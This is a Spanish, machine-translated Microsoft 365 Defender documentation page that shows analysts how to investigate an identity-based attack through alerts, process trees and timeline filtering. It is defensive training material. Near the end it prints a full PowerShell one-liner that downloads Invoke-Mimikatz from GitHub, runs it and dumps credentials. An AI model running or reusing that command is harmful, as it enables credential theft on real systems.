---
title: Ejemplo de un ataque basado en identidad
description: Paso a paso por un análisis de ejemplo de un ataque basado en identidad.
keywords: incidentes, alertas, investigar, correlación, ataque, máquinas, dispositivos, usuarios, identidades, identidad, buzón, correo electrónico, 365, microsoft, m365, respuesta a incidentes, ciberataque
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: es-ES
ms.lasthandoff: 06/08/2021
ms.locfileid: "52841011"
---
# <a name="example-of-an-identity-based-attack"></a><span data-ttu-id="e9c7d-104">Ejemplo de un ataque basado en identidad</span><span class="sxs-lookup"><span data-stu-id="e9c7d-104">Example of an identity-based attack</span></span>

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

<span data-ttu-id="e9c7d-105">**Se aplica a:**</span><span class="sxs-lookup"><span data-stu-id="e9c7d-105">**Applies to:**</span></span>
- <span data-ttu-id="e9c7d-106">Microsoft 365 Defender</span><span class="sxs-lookup"><span data-stu-id="e9c7d-106">Microsoft 365 Defender</span></span>

<span data-ttu-id="e9c7d-107">Microsoft Defender for Identity puede ayudar a detectar intentos malintencionados de poner en peligro las identidades de la organización.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-107">Microsoft Defender for Identity can help detect malicious attempts to compromise identities in your organization.</span></span> <span data-ttu-id="e9c7d-108">Dado que Defender for Identity se integra con Microsoft 365 Defender, los analistas de seguridad pueden tener visibilidad de las amenazas procedentes de Defender for Identity, como los intentos de elevación de privilegios de Netlogon sospechosos.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-108">Because Defender for Identity integrates with Microsoft 365 Defender, security analysts can have visibility on threats coming in from Defender for Identity, such as suspected Netlogon privilege elevation attempts.</span></span>

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a><span data-ttu-id="e9c7d-109">Análisis del ataque en Microsoft Defender for Identity</span><span class="sxs-lookup"><span data-stu-id="e9c7d-109">Analyzing the attack in Microsoft Defender for Identity</span></span>

<span data-ttu-id="e9c7d-110">Microsoft 365 Defender permite a los analistas filtrar alertas por origen de detección en la **pestaña Alertas** de la página incidentes.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-110">Microsoft 365 Defender allows analysts to filter alerts by detection source on the **Alerts** tab of the incidents page.</span></span> <span data-ttu-id="e9c7d-111">En el siguiente ejemplo, el origen de detección se filtra a **Defender for Identity**.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-111">In the following example, the detection source is filtered to **Defender for Identity**.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Ejemplo de filtrado del origen de detección de Defender for Identity":::

<span data-ttu-id="e9c7d-113">Al seleccionar la **alerta de ataque** sospechoso de sobrepaso de hash, se pasa a una página de Microsoft Cloud App Security que muestra información más detallada.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-113">Selecting the **Suspected overpass-the-hash attack** alert goes to a page in Microsoft Cloud App Security that displays more detailed information.</span></span> <span data-ttu-id="e9c7d-114">Siempre puedes obtener más información sobre una  alerta o ataque seleccionando [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) Obtener más información sobre este tipo de alerta para leer una descripción del ataque, así como sugerencias de corrección.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-114">You can always find out more about an alert or attack by selecting **Learn more about this alert type** to read a [description of the attack](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) as well as remediation suggestions.</span></span>
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Ejemplo de una alerta de ataque sospechoso de sobrepaso de hash"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a><span data-ttu-id="e9c7d-116">Investigar el mismo ataque en Microsoft Defender para endpoint</span><span class="sxs-lookup"><span data-stu-id="e9c7d-116">Investigating the same attack in Microsoft Defender for Endpoint</span></span>

<span data-ttu-id="e9c7d-117">Como alternativa, un analista puede usar Defender for Endpoint para obtener más información sobre la actividad en un punto de conexión.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-117">Alternatively, an analyst can use Defender for Endpoint to learn more about the activity on an endpoint.</span></span> <span data-ttu-id="e9c7d-118">Seleccione el incidente en la cola de incidentes y, a continuación, seleccione la **pestaña Alertas.** Desde aquí, también pueden identificar el origen de detección.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-118">Select the incident from the incident queue, then select the **Alerts** tab. From here, they can identify the detection source as well.</span></span> <span data-ttu-id="e9c7d-119">Un origen de detección etiquetado como EDR significa Detección y respuesta de puntos de conexión, que es Defender para endpoint.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-119">A detection source labeled as EDR stands for Endpoint Detection and Response, which is Defender for Endpoint.</span></span> <span data-ttu-id="e9c7d-120">Desde aquí, el analista selecciona una alerta detectada por EDR.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-120">From here, the analyst select an alert detected by EDR.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Ejemplo de detección y respuesta de puntos de conexión en Defender for Endpoint"::: 

<span data-ttu-id="e9c7d-122">La página de alertas muestra varias informaciones pertinentes, como el nombre del dispositivo afectado, el nombre de usuario, el estado de la investigación automática y los detalles de la alerta.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-122">The alert page displays various pertinent information such as the impacted device name, username, status of auto-investigation, and the alert details.</span></span> <span data-ttu-id="e9c7d-123">El artículo de alerta representa una representación visual del árbol de procesos.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-123">The alert story depicts a visual representation of the process tree.</span></span> <span data-ttu-id="e9c7d-124">El árbol de procesos es una representación jerárquica de los procesos primarios y secundarios relacionados con la alerta.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-124">The process tree is a hierarchical representation of parent and child processes related to the alert.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Ejemplo de un árbol de proceso de alerta en Defender for Endpoint"::: 

<span data-ttu-id="e9c7d-126">Cada proceso se puede expandir para ver detalles adicionales.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-126">Each process can be expanded to view additional details.</span></span> <span data-ttu-id="e9c7d-127">Los detalles que puede ver un analista son los comandos reales que se especificaron como parte de un script malintencionado, direcciones IP de conexión salientes y otra información útil.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-127">Details that an analyst can see are the actual commands that were entered as part of a malicious script, outbound connection IP addresses, and other useful information.</span></span>

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Ejemplo de detalles del proceso en Defender para endpoint":::
 
<span data-ttu-id="e9c7d-129">Al seleccionar **Ver en la escala de** tiempo, un analista puede profundizar aún más para determinar la hora exacta del compromiso.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-129">By selecting **See in timeline**, an analyst can drill down even further to determine the exact time of the compromise.</span></span> 

<span data-ttu-id="e9c7d-130">Microsoft Defender para endpoint puede detectar muchos archivos y scripts malintencionados.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-130">Microsoft Defender for Endpoint can detect many malicious files and scripts.</span></span> <span data-ttu-id="e9c7d-131">Sin embargo, debido a muchos usos legítimos para las conexiones salientes, PowerShell y la actividad de línea de comandos, algunas actividades se considerarían benignas hasta que crea un archivo o actividad malintencionados.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-131">However, due to many legitimate uses for outbound connections, PowerShell, and command-line activity, some activity would be considered benign until it creates a malicious file or activity.</span></span> <span data-ttu-id="e9c7d-132">Por lo tanto, el uso de la escala de tiempo ayuda a los analistas a poner la alerta en contexto con la actividad que lo rodea para determinar el origen o hora original del ataque que, de lo contrario, está oscurecido por la actividad común del sistema de archivos y el usuario.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-132">Therefore, using the timeline helps analysts to put the alert into context with the surrounding activity to determine the original source or time of the attack that otherwise is obscured by common file system and user activity.</span></span> 

<span data-ttu-id="e9c7d-133">Para ello, un analista comenzaría en el momento de la detección de alertas (en rojo) y se desplazaría hacia abajo en el tiempo para determinar cuándo se inició realmente la actividad original que condujo a la actividad malintencionada.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-133">To do this, an analyst would start at the time of the alert detection (in red) and scroll down backwards in time to determine when the original activity that led to the malicious activity actually started.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Ejemplo de inicio en el momento de la detección de alertas"::: 

<span data-ttu-id="e9c7d-135">Es importante comprender y distinguir la actividad común, como las conexiones de actualización de Windows, el tráfico de activación de software de confianza Windows, otras conexiones comunes a sitios de Microsoft, actividad de Internet de terceros, actividad Microsoft Endpoint Configuration Manager y otra actividad benigna de actividad sospechosa.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-135">It is important to understand and distinguish common activity such as Windows Update connections, Windows Trusted Software activation traffic, other common connections to Microsoft sites, third-party Internet activity, Microsoft Endpoint Configuration Manager activity, and other benign activity from suspicious activity.</span></span> <span data-ttu-id="e9c7d-136">Una forma de lograrlo es usando filtros de escala de tiempo.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-136">One way to accomplish this is by using timeline filters.</span></span> <span data-ttu-id="e9c7d-137">Hay muchos filtros que pueden resaltar una actividad específica al filtrar todo lo que el analista no quiera ver.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-137">There are many filters that can highlight specific activity while filtering out anything that the analyst does not want to view.</span></span> 

<span data-ttu-id="e9c7d-138">En la imagen siguiente, el analista se filtra para ver solo eventos de red y proceso.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-138">In the image below, the analyst filtered to view only network and process events.</span></span> <span data-ttu-id="e9c7d-139">Esto permite al analista ver las conexiones de red y los procesos que rodean el evento donde Bloc de notas una conexión con una dirección IP, que también vimos en el árbol de procesos.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-139">This allows the analyst to see the network connections and processes surrounding the event where Notepad established a connection with an IP address, which we also saw in the process tree.</span></span> 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Ejemplo de cómo Bloc de notas se usó para realizar una conexión saliente malintencionada"::: 

<span data-ttu-id="e9c7d-141">En este evento en particular, Bloc de notas se usó para realizar una conexión saliente malintencionada.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-141">In this particular event, Notepad was used to make a malicious outbound connection.</span></span> <span data-ttu-id="e9c7d-142">Sin embargo, a menudo los atacantes simplemente usan iexplorer.exe establecer conexiones para descargar una carga malintencionada, ya que normalmente iexplorer.exe procesos se consideran actividad regular del explorador web.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-142">However, often attackers will simply use iexplorer.exe to establish connections to download a malicious payload because ordinarily iexplorer.exe processes are considered regular web browser activity.</span></span>

<span data-ttu-id="e9c7d-143">Otro elemento que se debe buscar en la escala de tiempo serían los usos de PowerShell para las conexiones salientes.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-143">Another item to look for in the timeline would be PowerShell uses for outbound connections.</span></span> <span data-ttu-id="e9c7d-144">El analista buscaría conexiones correctas de PowerShell con comandos, como una conexión saliente a un sitio `IEX (New-Object Net.Webclient)` web que hospeda un archivo malintencionado.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-144">The analyst would look for successful PowerShell connections with commands such as `IEX (New-Object Net.Webclient)` followed by an outbound connection to a website hosting a malicious file.</span></span> 

<span data-ttu-id="e9c7d-145">En el siguiente ejemplo, PowerShell se usó para descargar y ejecutar Mimikatz desde un sitio web:</span><span class="sxs-lookup"><span data-stu-id="e9c7d-145">In the following example, PowerShell was used to download and execute Mimikatz from a website:</span></span>

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
<span data-ttu-id="e9c7d-146">Un analista puede buscar rápidamente palabras clave escribiendo la palabra clave en la barra de búsqueda para mostrar solo los eventos creados con PowerShell.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-146">An analyst can quickly search for keywords by typing in the keyword in the search bar to display only events created with PowerShell.</span></span> 

## <a name="next-step"></a><span data-ttu-id="e9c7d-147">Paso siguiente</span><span class="sxs-lookup"><span data-stu-id="e9c7d-147">Next step</span></span>

<span data-ttu-id="e9c7d-148">Consulta la ruta [de la investigación de suplantación](first-incident-path-phishing.md) de identidad.</span><span class="sxs-lookup"><span data-stu-id="e9c7d-148">See the [phishing](first-incident-path-phishing.md) investigation path.</span></span>

## <a name="see-also"></a><span data-ttu-id="e9c7d-149">Consulte también</span><span class="sxs-lookup"><span data-stu-id="e9c7d-149">See also</span></span>

- [<span data-ttu-id="e9c7d-150">Información general sobre incidentes</span><span class="sxs-lookup"><span data-stu-id="e9c7d-150">Incidents overview</span></span>](incidents-overview.md)
- [<span data-ttu-id="e9c7d-151">Administrar incidentes</span><span class="sxs-lookup"><span data-stu-id="e9c7d-151">Manage incidents</span></span>](manage-incidents.md)
- [<span data-ttu-id="e9c7d-152">Investigar incidentes</span><span class="sxs-lookup"><span data-stu-id="e9c7d-152">Investigate incidents</span></span>](investigate-incidents.md)
